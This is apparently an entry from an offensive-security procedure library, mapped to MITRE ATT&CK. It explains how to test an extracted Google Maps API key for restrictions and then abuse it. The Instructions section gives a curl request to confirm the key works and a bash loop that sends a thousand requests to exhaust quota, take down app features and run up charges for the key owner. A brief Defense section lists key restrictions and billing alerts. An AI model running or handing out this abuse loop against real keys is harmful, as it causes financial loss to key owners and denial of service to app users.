---
id: proc-uuid-2
tags:
  - api-abuse
  - dos
  - google-maps
  - quota-exhaustion
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-api-test]]'
  - '[[commands/curl-loop-abuse]]'
verified: false
platforms:
  - Android
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:32:38.673Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Test-and-Abuse-Unrestricted-Google-Maps-API-Key

## Summary

This procedure tests an extracted Google Maps API key for restrictions and abuses it by sending excessive queries to the Static Maps API, leading to quota exhaustion, app DoS, and financial costs to the key owner.

## Description

With the API key in hand, query the Google Static Maps endpoint to check for limits like IP restrictions or quotas. If unrestricted, automate high-volume requests to trigger billing overages or service denial for the app. This exploits keys without proper safeguards, common in misconfigured mobile apps. Prerequisites: Valid API key and internet access. Expected outcome: Confirmed abuse potential with successful high-volume calls.

## Requirements

1. Extracted API key string
2. Internet connectivity
3. Curl or equivalent HTTP client

## Defense

Defensive measures and detection strategies:

- Enforce API key restrictions in Google Cloud (e.g., HTTP referer, IP allowlist, API-specific quotas)
- Monitor usage spikes via Google Cloud billing alerts and API logs
- Rotate keys regularly and use short-lived tokens

## Objectives

1. Verify key functionality and lack of restrictions
2. Perform excessive queries to exhaust quotas
3. Achieve DoS on app features reliant on the API

## Instructions

### Step 1: Test API Key Validity

**Context**: Send a single request to the Static Maps API to confirm the key works without errors.

**Command** ([[commands/curl-api-test]]):
```bash
curl "https://maps.googleapis.com/maps/api/staticmap?key=YOUR_API_KEY&center=40.714%2C-74.006&zoom=12&size=400x400&format=png"
```

> This fetches a static map image. Expected output: Binary PNG data or HTTP 200; errors like 'quota exceeded' or 'invalid key' indicate restrictions.

### Step 2: Abuse with Repeated Queries

**Context**: Loop requests to simulate DoS, targeting quota limits (e.g., 25,000 requests/day for basic plans).

**Command** ([[commands/curl-loop-abuse]]):
```bash
for i in {1..1000}; do curl "https://maps.googleapis.com/maps/api/staticmap?key=YOUR_API_KEY&center=40.714%2C-74.006&zoom=12&size=400x400" > /dev/null 2>&1; sleep 0.1; done
```

> This sends 1000 requests with delays. Expected output: Most requests succeed until quota hit; monitor for 429 errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/curl-api-test]]
- [[commands/curl-loop-abuse]]

## Tools Used

- [[tools/curl]]

## Tags

- dos
- api-abuse
- google-maps
